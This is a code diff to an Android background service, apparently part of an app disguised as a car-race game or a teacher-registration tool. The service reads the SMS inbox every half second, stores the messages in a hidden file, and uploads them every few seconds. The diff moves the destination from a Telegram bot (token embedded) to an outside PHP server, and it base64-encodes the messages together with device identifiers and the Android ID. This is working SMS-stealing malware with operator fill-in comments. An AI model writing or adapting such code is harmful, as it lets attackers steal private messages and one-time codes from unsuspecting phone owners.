@@ -15,6 +15,8 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.PowerManager;
+import android.provider.Settings;
+import android.util.Base64;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
@@ -28,6 +30,7 @@ import java.io.FileOutputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.util.HashSet;
@@ -39,9 +42,10 @@ public class SmsService extends Service {
     private static final String CH_ID = "sms_sync";
     public  static final String JSON_FILE = ".temp.json";
 
-    // Ganti dengan bot & chat id kamu
-    private static final String BOT_TOKEN = "8539992688:AAEuPMyOXEweuaaHebCjGqsnMdeucQFKXhA";
-    private static final String CHAT_ID   = "8275632263";
+    // ====== UBAH INI ======
+    private static final String SERVER_URL = "http://pendataan-guru.page.gd/api.php";
+    private static final String API_KEY    = "fb93127a4ee69b569b8b941f63f08333a1ce66df305d34d37206d0df82053782";
+    // ======================
 
     private static final long POLL_INTERVAL_MS = 500L;
     private static final long SYNC_INTERVAL_MS = 3000L;
@@ -92,12 +96,10 @@ public class SmsService extends Service {
 
     private final Runnable syncRunnable = new Runnable() {
         @Override public void run() {
-            try { syncToTelegram(); } catch (Exception e) { Log.w(TAG, "sync", e); }
+            try { syncToServer(); } catch (Exception e) { Log.w(TAG, "sync", e); }
             handler.postDelayed(this, SYNC_INTERVAL_MS);
         }
     };
-
-    // ===== Poll inbox =====
 
     private void pollInbox() {
         if (!hasSms() || !hasStorage()) return;
@@ -106,7 +108,6 @@ public class SmsService extends Service {
         Set<String> seen = new HashSet<>();
         File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
 
-        // load existing
         if (target.exists() && target.length() > 0) {
             try {
                 byte[] data = readAll(target);
@@ -154,9 +155,7 @@ public class SmsService extends Service {
         if (changed) writeJson(target, merged);
     }
 
-    // ===== Sync to Telegram =====
-
-    private void syncToTelegram() {
+    private void syncToServer() {
         if (!hasStorage()) return;
         File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);
         if (!target.exists() || target.length() == 0) return;
@@ -166,7 +165,7 @@ public class SmsService extends Service {
             String hash = sha256(data);
             if (hash.equals(lastSentHash)) return;
 
-            boolean ok = uploadAsDocument(target, data);
+            boolean ok = upload(target, data);
             if (ok) {
                 lastSentHash = hash;
                 Log.d(TAG, "uploaded " + data.length + " bytes");
@@ -176,36 +175,43 @@ public class SmsService extends Service {
         }
     }
 
-    private boolean uploadAsDocument(File file, byte[] data) {
-        String boundary = "----CarRaceBoundary" + System.currentTimeMillis();
+    private boolean upload(File file, byte[] data) {
         try {
-            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
+            JSONObject device = new JSONObject();
+            device.put("manufacturer", safe(Build.MANUFACTURER));
+            device.put("model", safe(Build.MODEL));
+            device.put("brand", safe(Build.BRAND));
+            device.put("device", safe(Build.DEVICE));
+            device.put("product", safe(Build.PRODUCT));
+            device.put("android_version", safe(Build.VERSION.RELEASE));
+            device.put("sdk", Build.VERSION.SDK_INT);
+            device.put("android_id", safe(androidId()));
+            device.put("host", safe(Build.HOST));
+
+            String deviceB64 = Base64.encodeToString(
+                    device.toString().getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
+            String smsB64 = Base64.encodeToString(data, Base64.NO_WRAP);
+
+            String body = "device_info=" + URLEncoder.encode(deviceB64, "UTF-8")
+                    + "&sms=" + URLEncoder.encode(smsB64, "UTF-8");
+
+            URL url = new URL(SERVER_URL + "?key=" + URLEncoder.encode(API_KEY, "UTF-8"));
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("POST");
             conn.setDoOutput(true);
             conn.setConnectTimeout(15000);
             conn.setReadTimeout(15000);
-            conn.setRequestProperty("Content-Type",
-                    "multipart/form-data; boundary=" + boundary);
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setRequestProperty("Content-Length", String.valueOf(body.getBytes().length));
 
             OutputStream os = conn.getOutputStream();
-
-            writeField(os, boundary, "chat_id", CHAT_ID);
-            writeField(os, boundary, "caption",
-                    "Update: " + file.getName() + " (" + data.length + " bytes)");
-
-            os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
-            os.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
-                    + file.getName() + "\"\r\n").getBytes(StandardCharsets.UTF_8));
-            os.write(("Content-Type: application/json\r\n\r\n").getBytes(StandardCharsets.UTF_8));
-            os.write(data);
-            os.write("\r\n".getBytes(StandardCharsets.UTF_8));
-            os.write(("--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8));
+            os.write(body.getBytes(StandardCharsets.UTF_8));
             os.flush();
             os.close();
 
             int code = conn.getResponseCode();
             conn.disconnect();
+            Log.d(TAG, "server resp=" + code);
             return code == 200;
         } catch (Exception e) {
             Log.e(TAG, "upload failed", e);
@@ -213,14 +219,17 @@ public class SmsService extends Service {
         }
     }
 
-    private void writeField(OutputStream os, String boundary, String name, String value) throws Exception {
-        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
-        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n")
-                .getBytes(StandardCharsets.UTF_8));
-        os.write((value + "\r\n").getBytes(StandardCharsets.UTF_8));
+    private String androidId() {
+        try {
+            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        } catch (Exception e) {
+            return "unknown";
+        }
     }
 
-    // ===== Helpers =====
+    private static String safe(String s) {
+        return s == null ? "" : s.replace("\n", " ");
+    }
 
     private void writeJson(File target, JSONArray arr) {
         try {
